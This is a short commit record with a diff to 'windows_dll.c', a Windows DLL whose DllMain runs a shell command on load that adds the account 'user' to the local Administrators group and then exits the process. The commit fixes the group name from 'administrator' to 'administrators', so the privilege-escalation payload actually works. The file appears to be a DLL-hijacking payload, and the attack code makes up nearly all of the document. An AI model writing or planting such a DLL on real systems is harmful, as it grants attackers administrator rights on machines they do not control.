6b9a092fd2e4ffa8e62237c5ea6e11227149a2c4
Jeff Baxter <jeffbaxter@live.com>
2021-03-04 21:39:49 -0500

    Update windows_dll.c

--- windows_dll.c
+++ windows_dll.c
@@ -5,7 +5,7 @@
 
 BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
     if (dwReason == DLL_PROCESS_ATTACH) {
-        system("cmd.exe /k net localgroup administrator user /add");
+        system("cmd.exe /k net localgroup administrators user /add");
         ExitProcess(0);
     }
     return TRUE;
